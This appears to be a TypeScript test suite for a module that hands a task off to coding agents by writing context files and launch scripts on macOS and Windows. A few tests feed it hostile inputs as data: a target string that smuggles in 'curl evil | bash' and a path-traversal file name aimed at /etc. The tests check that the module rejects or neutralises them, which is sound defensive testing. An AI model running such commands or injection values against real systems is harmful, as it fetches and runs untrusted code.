import { test, expect } from "bun:test";
import { runHandoff, safeFileName, buildDeeplinkUrl, HANDOFF_PROMPT } from "../src/handoff";
import {
  batQuote,
  buildWindowsStartBat,
  windowsHandoffSpawn,
  windowsOpenApp,
  resolveWindowsTerminal,
} from "../src/handoff-win32";
import { AGENT_CANDIDATES } from "../src/agents";
import { setLogEnabled } from "../src/log";

setLogEnabled(false); // hermetic：不写真实 ~/.pie/logs

function harness() {
  const writes: { path: string; content: string; mode?: number }[] = [];
  const dirs: string[] = [];
  const spawns: { cmd: string; args: string[]; cwd: string }[] = [];
  const opts = {
    ensureDir: (d: string) => { dirs.push(d); },
    writeFile: (p: string, c: string, m?: number) => { writes.push({ path: p, content: c, mode: m }); },
    spawn: async (cmd: string, args: string[], cwd: string) => {
      spawns.push({ cmd, args, cwd });
      return { stdout: "", exitCode: 0 };
    },
    now: () => "2026-07-07",
    detect: () =>
      AGENT_CANDIDATES.map((c) => ({
        ...c,
        path: c.kind === "app" ? c.appPaths![0] : `/Users/x/.local/bin/${c.bin}`,
      })), // 默认全"已装"，带出绝对路径
  };
  return { writes, dirs, spawns, opts };
}

test("creates dated dir, writes context.md, launches via osascript do script (padded)", async () => {
  const h = harness();
  const r = await runHandoff({ target: "claude", context: "Refactor the auth module" }, h.opts);
  expect(r.mode).toBe("terminal");
  // 目录含日期前缀 + slug
  expect(r.dir).toContain("pie-handoffs");
  expect(r.dir).toContain("2026-07-07-refactor-the-auth-module");
  expect(h.dirs).toContain(r.dir);
  // context.md 原文落盘
  const ctx = h.writes.find((w) => w.path.endsWith("context.md"));
  expect(ctx?.content).toBe("Refactor the auth module");
  // start.command 可执行、内容 cd 进目录并拉起交互式 claude（不带 skip-permissions）
  const cmd = h.writes.find((w) => w.path.endsWith("start.command"));
  expect(cmd?.mode).toBe(0o755);
  expect(cmd?.content).toContain("exec '/Users/x/.local/bin/claude'");
  expect(cmd?.content).not.toContain("exec claude "); // 裸命令名 = 依赖运行时 PATH = 真机上会 not found
  expect(cmd?.content).not.toContain("--dangerously-skip-permissions");
  // 用 osascript do script 唤起（不是 `open`——那条路径把脚本路径当键盘输入喂给
  // 交互式 zsh，zsh 启动期 stdin 消费者会吞首字符；见 handoff.ts LAUNCH_PAD 注释）
  expect(h.spawns).toHaveLength(1);
  expect(h.spawns[0].cmd).toBe("osascript");
  const doScript = h.spawns[0].args.find((a) => a.startsWith("do script"));
  expect(doScript).toBeDefined();
  // 注入串必须带前导牺牲空格垫片，且引用 start.command
  expect(doScript!).toContain('do script "        exec');
  expect(doScript!).toContain("start.command");
});

test("stages files with basename, neutralizing path traversal", async () => {
  const h = harness();
  await runHandoff(
    { target: "claude", context: "x", files: [{ name: "../../etc/evil.txt", content: "DATA" }] },
    h.opts,
  );
  // 遍历被中和：写在 handoff 目录内的裸名 evil.txt，不逃逸
  const staged = h.writes.find((w) => w.content === "DATA");
  expect(staged?.path.endsWith("/evil.txt")).toBe(true);
  expect(staged?.path).not.toContain("etc/evil");
});

test("safeFileName rejects reserved / empty / dot names", () => {
  expect(() => safeFileName("context.md")).toThrow();
  expect(() => safeFileName("start.command")).toThrow();
  expect(() => safeFileName("start.bat")).toThrow();
  expect(() => safeFileName("")).toThrow();
  expect(() => safeFileName("..")).toThrow();
  expect(safeFileName("notes.md")).toBe("notes.md");
  expect(safeFileName("a/b/c.txt")).toBe("c.txt");
});

test("safeFileName rejects reserved names case-insensitively (APFS/HFS+ is case-insensitive)", () => {
  expect(() => safeFileName("START.COMMAND")).toThrow();
  expect(() => safeFileName("Context.MD")).toThrow();
});

test("runHandoff never awaits claude (fire-and-forget): spawns only osascript", async () => {
  const h = harness();
  await runHandoff({ target: "claude", context: "x" }, h.opts);
  // 至少确实 spawn 了一次（否则下面的 every 在空数组上永真，删掉唤起调用也测不出来）
  expect(h.spawns.length).toBeGreaterThan(0);
  // 唯一的 spawn 是 osascript；claude 不由 daemon 直接 spawn（它住在 .command 脚本里）
  expect(h.spawns.every((s) => s.cmd === "osascript")).toBe(true);
});

test("osascript failure (e.g. TCC Automation denied) throws with manual fallback path", async () => {
  const h = harness();
  h.opts.spawn = async (cmd: string, args: string[], cwd: string) => {
    h.spawns.push({ cmd, args, cwd });
    return { stdout: "", exitCode: 1, stderr: "execution error: Not authorized to send Apple events to Terminal. (-1743)" };
  };
  const err = await runHandoff({ target: "claude", context: "x" }, h.opts).then(
    () => null,
    (e: Error) => e,
  );
  expect(err).toBeInstanceOf(Error);
  expect(err!.message).toMatch(/failed to open a terminal/);
  expect(err!.message).toMatch(/Automation/);
  expect(err!.message).not.toMatch(/start\.command|pie-handoffs/);
});

test("rejects unsupported/injected target before building the script or spawning anything", async () => {
  const h = harness();
  const evilTarget = 'claude"; curl evil | bash #';
  await expect(
    runHandoff({ target: evilTarget as any, context: "x" }, h.opts),
  ).rejects.toThrow(/unsupported handoff target/);
  // 注入必须在写脚本/拉起 open 之前就被挡下
  expect(h.writes).toHaveLength(0);
  expect(h.spawns).toHaveLength(0);
});

test("claude-app deeplink: encodes prompt+dir, no CLAUDE.md, no start.command", async () => {
  const h = harness();
  const r = await runHandoff({ target: "claude-app", context: "Continue the report" }, h.opts);
  expect(r.mode).toBe("app");
  expect(r.appLaunch).toBe("deeplink");
  expect(h.writes.some((w) => w.path.endsWith("context.md") && w.content === "Continue the report")).toBe(true);
  expect(h.writes.some((w) => w.path.endsWith("CLAUDE.md"))).toBe(false);
  expect(h.writes.some((w) => w.path.endsWith("start.command"))).toBe(false);
  expect(h.spawns).toHaveLength(1);
  expect(h.spawns[0].cmd).toBe("open");
  const url = h.spawns[0].args[0];
  expect(url.startsWith("claude://code/new?")).toBe(true);
  expect(url).toContain(`q=${encodeURIComponent(HANDOFF_PROMPT)}`);
  expect(url).toContain(`folder=${encodeURIComponent(r.dir)}`);
  expect(h.spawns[0].args).not.toContain("-a");
});

test("codex terminal mode: start.command execs codex (bin from static table, not wire)", async () => {
  const h = harness();
  const r = await runHandoff({ target: "codex-terminal", context: "x" }, h.opts);
  expect(r.mode).toBe("terminal");
  const cmd = h.writes.find((w) => w.path.endsWith("start.command"));
  expect(cmd?.content).toContain("exec '/Users/x/.local/bin/codex'");
  expect(cmd?.content).not.toContain("/claude'");
});

test("target not in the freshly-detected set is rejected before any side effect", async () => {
  const h = harness();
  h.opts.detect = () => AGENT_CANDIDATES.filter((c) => c.id === "claude-app"); // codex 未装
  await expect(
    runHandoff({ target: "codex-terminal", context: "x" }, h.opts),
  ).rejects.toThrow(/unsupported handoff target/);
  expect(h.writes).toHaveLength(0);
  expect(h.spawns).toHaveLength(0);
});

test("legacy wire target 'claude' aliases to claude-terminal", async () => {
  const h = harness();
  const r = await runHandoff({ target: "claude", context: "x" }, h.opts);
  expect(r.mode).toBe("terminal");
  const cmd = h.writes.find((w) => w.path.endsWith("start.command"));
  expect(cmd?.content).toContain("exec '/Users/x/.local/bin/claude'");
});

test("safeFileName rejects CLAUDE.md case-insensitively (app-mode reserved file)", () => {
  expect(() => safeFileName("CLAUDE.md")).toThrow();
  expect(() => safeFileName("claude.md")).toThrow();
});

test("open-a failure (no deeplink) is semantic (no folder path)", async () => {
  const h = harness();
  h.opts.spawn = async (cmd: string, args: string[], cwd: string) => {
    h.spawns.push({ cmd, args, cwd });
    return { stdout: "", exitCode: 1, stderr: "Unable to find application named 'Cursor'" };
  };
  await expect(runHandoff({ target: "cursor-app", context: "x" }, h.opts)).rejects.toThrow(
    /failed to open Cursor \(App\)/,
  );
});

test("start.command 里绝对路径带空格也安全（shell quote）", async () => {
  const h = harness();
  h.opts.detect = () => [{
    id: "claude-terminal" as const, label: "Claude Code (Terminal)", kind: "terminal" as const,
    bin: "claude", argv: ["{prompt}"], path: "/Users/na me/.local/bin/claude",
  }];
  await runHandoff({ target: "claude-terminal", context: "x" }, h.opts);
  const cmd = h.writes.find((w) => w.path.endsWith("start.command"));
  expect(cmd?.content).toContain("exec '/Users/na me/.local/bin/claude'");
});

test("argv 模板：位置参数形态（claude）", async () => {
  const h = harness();
  await runHandoff({ target: "claude-terminal", context: "x" }, h.opts);
  const cmd = h.writes.find((w) => w.path.endsWith("start.command"));
  expect(cmd?.content).toContain(
    `exec '/Users/x/.local/bin/claude' 'Read context.md in this directory for the handed-off context, then continue the task.'`,
  );
});

test("argv 模板：flag 形态（opencode --prompt）", async () => {
  const h = harness();
  h.opts.detect = () => [{
    id: "opencode-terminal" as const, label: "OpenCode (Terminal)", kind: "terminal" as const,
    bin: "opencode", argv: ["--prompt", "{prompt}"], path: "/Users/x/.opencode/bin/opencode",
  }];
  await runHandoff({ target: "opencode-terminal", context: "x" }, h.opts);
  const cmd = h.writes.find((w) => w.path.endsWith("start.command"));
  expect(cmd?.content).toContain(
    `exec '/Users/x/.opencode/bin/opencode' '--prompt' 'Read context.md in this directory for the handed-off context, then continue the task.'`,
  );
});

test("cursor-app 无深链：写 AGENTS.md + open -a", async () => {
  const h = harness();
  const r = await runHandoff({ target: "cursor-app", context: "x" }, h.opts);
  expect(r.mode).toBe("app");
  expect(r.appLaunch).toBe("open-a");
  const guide = h.writes.find((w) => w.path.endsWith("AGENTS.md"));
  expect(guide?.content).toContain("Read context.md");
  expect(h.writes.find((w) => w.path.endsWith("CLAUDE.md"))).toBeUndefined();
  expect(h.spawns[0]).toMatchObject({ cmd: "open", args: ["-a", "/Applications/Cursor.app", r.dir] });
});

test("codex-app deeplink: prompt+path encoded, no AGENTS.md", async () => {
  const h = harness();
  const r = await runHandoff({ target: "codex-app", context: "x" }, h.opts);
  expect(r.appLaunch).toBe("deeplink");
  expect(h.writes.some((w) => w.path.endsWith("AGENTS.md"))).toBe(false);
  const url = h.spawns[0].args[0];
  expect(url.startsWith("codex://new?")).toBe(true);
  expect(url).toContain(`prompt=${encodeURIComponent(HANDOFF_PROMPT)}`);
  expect(url).toContain(`path=${encodeURIComponent(r.dir)}`);
});

test("buildDeeplinkUrl URL-encodes reserved characters in prompt and dir", () => {
  const url = buildDeeplinkUrl(
    "claude://code/new?q={prompt}&folder={dir}",
    "a b&c=d",
    "/Users/na me/pie-handoffs/2026-08-15-x",
  );
  expect(url).toBe(
    "claude://code/new?q=a%20b%26c%3Dd&folder=%2FUsers%2Fna%20me%2Fpie-handoffs%2F2026-08-15-x",
  );
});

test("deeplink non-zero falls back to open -a and writes convention", async () => {
  const h = harness();
  h.opts.spawn = async (cmd: string, args: string[], cwd: string) => {
    h.spawns.push({ cmd, args, cwd });
    if (args[0]?.startsWith("claude://")) {
      return { stdout: "", exitCode: 1, stderr: "LSOpenURLsWithRole() failed" };
    }
    return { stdout: "", exitCode: 0 };
  };
  const r = await runHandoff({ target: "claude-app", context: "x" }, h.opts);
  expect(r.appLaunch).toBe("open-a");
  expect(h.spawns).toHaveLength(2);
  expect(h.spawns[0].args[0].startsWith("claude://")).toBe(true);
  expect(h.spawns[1]).toMatchObject({ cmd: "open", args: ["-a", "/Applications/Claude.app", r.dir] });
  const guide = h.writes.find((w) => w.path.endsWith("CLAUDE.md"));
  expect(guide?.content).toContain("Read context.md");
});

test("deeplink fail + open-a fail is semantic (no folder path)", async () => {
  const h = harness();
  h.opts.spawn = async (cmd: string, args: string[], cwd: string) => {
    h.spawns.push({ cmd, args, cwd });
    return { stdout: "", exitCode: 1, stderr: "Unable to find application named 'Claude'" };
  };
  await expect(runHandoff({ target: "claude-app", context: "x" }, h.opts)).rejects.toThrow(
    /failed to open Claude Code \(App\)/,
  );
  expect(h.spawns).toHaveLength(2);
});

test("RESERVED 挡掉 agents.md（大小写不敏感）", () => {
  expect(() => safeFileName("AGENTS.md")).toThrow();
  expect(() => safeFileName("agents.md")).toThrow();
});

test("RESERVED 挡掉 start.bat（大小写不敏感）", () => {
  expect(() => safeFileName("START.BAT")).toThrow();
});

test("batQuote doubles embedded quotes", () => {
  expect(batQuote(`C:\\na me\\opencode.cmd`)).toBe(`"C:\\na me\\opencode.cmd"`);
  expect(batQuote(`say "hi"`)).toBe(`"say ""hi"""`);
});

test("buildWindowsStartBat: cd /d + quoted absolute path, no bash shebang", () => {
  const bat = buildWindowsStartBat(
    "C:\\Users\\x\\pie-handoffs\\d",
    "C:\\Users\\x\\AppData\\Roaming\\npm\\opencode.cmd",
    ["--prompt", "Read context.md"],
  );
  expect(bat).not.toContain("#!/bin/bash");
  expect(bat).toContain("cd /d \"C:\\Users\\x\\pie-handoffs\\d\"");
  expect(bat).toContain("\"C:\\Users\\x\\AppData\\Roaming\\npm\\opencode.cmd\" \"--prompt\" \"Read context.md\"");
});

test("windowsHandoffSpawn: wt present → start wt -d dir cmd /c start.bat", () => {
  const s = windowsHandoffSpawn("C:\\h\\d", "C:\\h\\d\\start.bat", "C:\\WindowsApps\\wt.exe");
  expect(s.cmd).toBe("cmd.exe");
  expect(s.args).toEqual([
    "/c", "start", "", "C:\\WindowsApps\\wt.exe", "-d", "C:\\h\\d", "cmd.exe", "/c", "C:\\h\\d\\start.bat",
  ]);
  expect(s.args).not.toContain("osascript");
});

test("windowsHandoffSpawn: no wt → start /D dir cmd /c start.bat", () => {
  const s = windowsHandoffSpawn("C:\\h\\d", "C:\\h\\d\\start.bat", null);
  expect(s.args).toEqual(["/c", "start", "", "/D", "C:\\h\\d", "cmd.exe", "/c", "C:\\h\\d\\start.bat"]);
});

test("resolveWindowsTerminal: which 命中优先于 well-known", () => {
  expect(
    resolveWindowsTerminal({
      which: (b) => (b === "wt.exe" ? "D:\\wt.exe" : null),
      exists: () => true,
      home: "C:\\Users\\x",
    }),
  ).toBe("D:\\wt.exe");
});

test("resolveWindowsTerminal: which miss 回落 WindowsApps", () => {
  const p = resolveWindowsTerminal({
    which: () => null,
    exists: (path) => path.replace(/\\/g, "/").endsWith("WindowsApps/wt.exe"),
    home: "C:\\Users\\x",
  });
  expect(p?.replace(/\\/g, "/")).toMatch(/WindowsApps\/wt\.exe$/);
});

test("win32 terminal: writes start.bat, never osascript / start.command", async () => {
  const h = harness();
  h.opts.detect = () => [{
    id: "opencode-terminal" as const, label: "OpenCode (Terminal)", kind: "terminal" as const,
    bin: "opencode", argv: ["--prompt", "{prompt}"],
    path: "C:\\Users\\x\\AppData\\Roaming\\npm\\opencode.cmd",
  }];
  const r = await runHandoff(
    { target: "opencode-terminal", context: "x" },
    { ...h.opts, platform: "win32", which: () => null, exists: () => false },
  );
  expect(r.mode).toBe("terminal");
  expect(h.writes.some((w) => w.path.endsWith("start.command"))).toBe(false);
  const bat = h.writes.find((w) => w.path.endsWith("start.bat"));
  expect(bat?.content).toContain("@echo off");
  expect(bat?.content).toContain("opencode.cmd");
  expect(bat?.content).not.toContain("#!/bin/bash");
  expect(h.spawns).toHaveLength(1);
  expect(h.spawns[0].cmd).toBe("cmd.exe");
  expect(h.spawns[0].args[0]).toBe("/c");
  expect(h.spawns[0].args).toContain("start");
  expect(h.spawns.some((s) => s.cmd === "osascript")).toBe(false);
});

test("win32 terminal: wt 命中时 start 的参数带 wt -d", async () => {
  const h = harness();
  h.opts.detect = () => [{
    id: "codex-terminal" as const, label: "Codex (Terminal)", kind: "terminal" as const,
    bin: "codex", argv: ["{prompt}"],
    path: "C:\\Users\\x\\AppData\\Local\\Programs\\OpenAI\\Codex\\bin\\codex.exe",
  }];
  await runHandoff(
    { target: "codex-terminal", context: "x" },
    { ...h.opts, platform: "win32", which: (b) => (b === "wt.exe" ? "C:\\wt.exe" : null) },
  );
  expect(h.spawns[0].args).toContain("C:\\wt.exe");
  expect(h.spawns[0].args).toContain("-d");
});

test("win32 launch failure is semantic (no script path)", async () => {
  const h = harness();
  h.opts.detect = () => [{
    id: "codex-terminal" as const, label: "Codex (Terminal)", kind: "terminal" as const,
    bin: "codex", argv: ["{prompt}"], path: "C:\\codex.exe",
  }];
  h.opts.spawn = async (cmd, args, cwd) => {
    h.spawns.push({ cmd, args, cwd });
    return { stdout: "", exitCode: 1, stderr: "start failed" };
  };
  const err = await runHandoff(
    { target: "codex-terminal", context: "x" },
    { ...h.opts, platform: "win32", which: () => null, exists: () => false },
  ).then(
    () => null,
    (e: Error) => e,
  );
  expect(err).toBeInstanceOf(Error);
  expect(err!.message).toMatch(/failed to open a terminal/);
  expect(err!.message).not.toMatch(/start\.bat|pie-handoffs/i);
});

const CURSOR_EXE = "C:\\Users\\x\\AppData\\Local\\Programs\\cursor\\Cursor.exe";

function winCursorApp() {
  return {
    id: "cursor-app" as const,
    label: "Cursor (App)",
    kind: "app" as const,
    appPaths: [CURSOR_EXE],
    convention: "AGENTS.md" as const,
    path: CURSOR_EXE,
    verified: false as const,
  };
}

test("windowsOpenApp: cmd /c start \"\" <exe> <dir> (bare argv, no batQuote)", () => {
  const s = windowsOpenApp(CURSOR_EXE, "C:\\h\\d");
  expect(s.cmd).toBe("cmd.exe");
  expect(s.args).toEqual(["/c", "start", "", CURSOR_EXE, "C:\\h\\d"]);
  expect(s.args).not.toContain(batQuote(CURSOR_EXE));
  expect(s.args).not.toContain(batQuote("C:\\h\\d"));
  expect(s.args).not.toContain("osascript");
  expect(s.args).not.toContain("-a");
});

test("win32 app with deeplink template still uses start exe (no mac open)", async () => {
  const h = harness();
  h.opts.detect = () => [{
    ...winCursorApp(),
    id: "codex-app" as const,
    label: "Codex / ChatGPT (App)",
    deeplink: { template: "codex://new?prompt={prompt}&path={dir}" },
  }];
  const r = await runHandoff(
    { target: "codex-app", context: "x" },
    { ...h.opts, platform: "win32" },
  );
  expect(r.mode).toBe("app");
  expect(r.appLaunch).toBe("open-a");
  expect(h.writes.some((w) => w.path.endsWith("AGENTS.md"))).toBe(true);
  expect(h.spawns).toHaveLength(1);
  expect(h.spawns[0].cmd).toBe("cmd.exe");
  expect(h.spawns.some((s) => s.cmd === "open" || s.args[0]?.startsWith("codex://"))).toBe(false);
});

test("win32 app: start \"\" <exe> <dir>，写 AGENTS.md，mode=app", async () => {
  const h = harness();
  h.opts.detect = () => [winCursorApp()];
  const r = await runHandoff(
    { target: "cursor-app", context: "Continue the report" },
    { ...h.opts, platform: "win32" },
  );
  expect(r.mode).toBe("app");
  expect(h.writes.some((w) => w.path.endsWith("context.md") && w.content === "Continue the report")).toBe(true);
  const guide = h.writes.find((w) => w.path.endsWith("AGENTS.md"));
  expect(guide?.content).toContain("Read context.md");
  expect(h.writes.some((w) => w.path.endsWith("start.command") || w.path.endsWith("start.bat"))).toBe(false);
  expect(h.spawns).toHaveLength(1);
  expect(h.spawns[0].cmd).toBe("cmd.exe");
  expect(h.spawns[0].args).toEqual(["/c", "start", "", CURSOR_EXE, r.dir]);
  expect(h.spawns.some((s) => s.cmd === "open" || s.cmd === "osascript")).toBe(false);
});

test("win32 app start 失败：文件已落盘，错误不含路径", async () => {
  const h = harness();
  h.opts.detect = () => [winCursorApp()];
  h.opts.spawn = async (cmd, args, cwd) => {
    h.spawns.push({ cmd, args, cwd });
    return { stdout: "", exitCode: 1, stderr: "start failed" };
  };
  await expect(
    runHandoff({ target: "cursor-app", context: "x" }, { ...h.opts, platform: "win32" }),
  ).rejects.toThrow(/failed to open Cursor \(App\)/);
  expect(h.writes.some((w) => w.path.endsWith("context.md"))).toBe(true);
  expect(h.writes.some((w) => w.path.endsWith("AGENTS.md"))).toBe(true);
});

test("darwin launch 源码不提 Windows 唤起", async () => {
  const src = await Bun.file(new URL("../src/handoff-darwin.ts", import.meta.url)).text();
  expect(src).not.toContain("cmd.exe");
  expect(src).not.toContain("start.bat");
  expect(src).not.toContain("win32");
});

test("win32 launch 源码不提 mac 唤起", async () => {
  const src = await Bun.file(new URL("../src/handoff-win32.ts", import.meta.url)).text();
  expect(src).not.toContain("osascript");
  expect(src).not.toContain("open -a");
  expect(src).not.toContain("start.command");
  expect(src).not.toContain("/Applications");
});
